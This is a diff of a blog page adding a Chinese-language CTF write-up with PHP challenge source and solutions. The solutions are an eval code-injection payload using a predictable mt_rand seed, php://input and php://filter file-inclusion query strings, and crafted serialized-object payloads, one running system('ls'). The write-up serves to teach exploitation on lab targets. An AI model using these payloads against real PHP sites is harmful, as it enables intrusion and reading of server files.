@@ -408,14 +408,14 @@ index.php
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1k
+                        1.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        6 分
                     </div>
                     
                 
@@ -517,6 +517,125 @@ index.php
 <p><code>O:7:&quot;convent&quot;:2:{s:4:&quot;warn&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;}</code></p>
 <img src="/2019/12/25/ctf-sheng-dan-meng-xin-sai/2.png">
 <p>查看dsuhhjfdgjhaskjdkj.txt，得到flag</p>
+<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>代码审计</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$seed</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$key</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$true_key</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$true_key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"Key Confirm"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Key Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">"var_dump($a);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>可以看到它包含了flag.php,通过get方式获得三个变量，mt_srand用来生成种子，true_key为验证的随即数。如果，验证的随即数和我们传入的key一样时，执行eval(“var_dump($a)”).</p>
+<p>在本地搭建源码，获得$ture_key的值为1244335972，版本不一样生成的key可能不一样，所以，首先查看目录。</p>
+<p><code>?hello=print_r(scandir(&#39;./&#39;))&amp;seed=1&amp;key=1244335972</code></p>
+<img src="/2019/12/25/ctf-sheng-dan-meng-xin-sai/3.png">
+<p>查看flag.php</p>
+<p><code>?hello=print_r(cat flag.php)&amp;seed=1&amp;key=1244335972</code></p>
+<p>注：cat flag.php 用反引号，得到flag</p>
+<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><p>这道题和bugkuctf 的一道web题基本一样，源码给出</p>
+<p>查看源码，发现了注释内容</p>
+<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+
+if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!&lt;br>";
+    include($file); //class.php
+}else{
+    echo "you are not admin ! ";
+}
+ --></span>
+</code></pre>
+<p>首先得到admin的权限，用php://input 来post输入user的内容，目前hackbar不支持直接post值，抓包，随便post变量，然后将变量去掉，post值为admin。</p>
+<img src="/2019/12/25/ctf-sheng-dan-meng-xin-sai/4.png">
+<p>用文件包含漏洞拿到源码</p>
+<p><code>?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><code>?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</code></p>
+<p>class.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Read</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//fffffflag.php</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token string">"Awwwwwwwwwww man"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>index.php</p>
+<pre class=" language-php+HTML"><code class="language-php+HTML"><?php
+error_reporting(E_ALL & ~E_NOTICE);
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+
+if(isset($user)&&(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!<br>";
+    if(preg_match("/fffffflag/",$file)){
+        exit();
+    }else{
+        include($file); //class.php
+        $pass = unserialize($pass);
+        echo $pass;
+    }
+}else{
+    echo "you are not admin ! ";
+    echo "<br>";
+    echo "hava a rest and then change your choose.";
+}
+
+?>
+
+<!--
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+
+if(isset($user)&&(file_get_contents($user,'r')==="admin")){
+    echo "hello admin!<br>";
+    include($file); //class.php
+}else{
+    echo "you are not admin ! ";
+}
+ -->
+</code></pre>
+<p>构造序列化，读取fffffflag.php,如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">Read</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//fffffflag.php</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token string">"Awwwwwwwwwww man"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$ctf</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$ctf</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token string">'fffffflag.php'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p>payload：</p>
+<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>user<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input&amp;file=class.php&amp;pass=O:4:"Read":1:{s:4:"file";s:13:"fffffflag.php";}</span>
+</code></pre>
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>dp泄露，直接跑脚本。</p>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h4><p>lsb隐写，开始得到的flag为假的</p>
 
             </div>
             <hr/>
@@ -902,7 +1021,7 @@ path = "C:/Users/26624/De</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">9.4k</span>
+                <span class="white-color">9.8k</span>
             
 
             
